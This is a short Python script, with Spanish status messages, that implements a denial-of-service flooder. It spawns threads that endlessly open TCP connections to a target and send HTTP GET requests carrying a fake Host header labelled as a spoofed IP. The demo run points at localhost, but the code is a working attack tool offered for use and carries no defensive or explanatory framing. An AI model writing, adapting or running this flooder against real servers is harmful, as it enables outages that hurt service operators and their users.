import threading
import socket
import signal
import time


class DDoS:
	def __init__(self,target,port):
		self.target = target
		self.fake_ip = '182.21.20.32'
		self.port = int(port)
		self.attack_num = 0
		self.thread_number = 0

	def attack(self):
		while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((self.target, self.port))
			s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
			s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
			self.attack_num += 1
			print("Número de ataques DDoS:",self.attack_num)
			s.close()

	def run(self,thread_number):
		self.thread_number = thread_number
		for i in range(self.thread_number):
			signal.signal(signal.SIGINT, self.handler)
			ddos = threading.Thread(target=self.attack)
			print("Hilo creado con éxito")
			ddos.start()

	def handler(self, signum, frame):
		res = input("Ctrl-c was pressed. Do you really want to exit? y/n ")
		if res == 'y':
			exit(1)

if __name__ == "__main__":
	test_target = "127.0.0.1"
	test_port = "80"
	MyDDoS = DDoS(test_target,test_port)
	print("Iniciando ataque DDoS...")
	MyDDoS.run(10)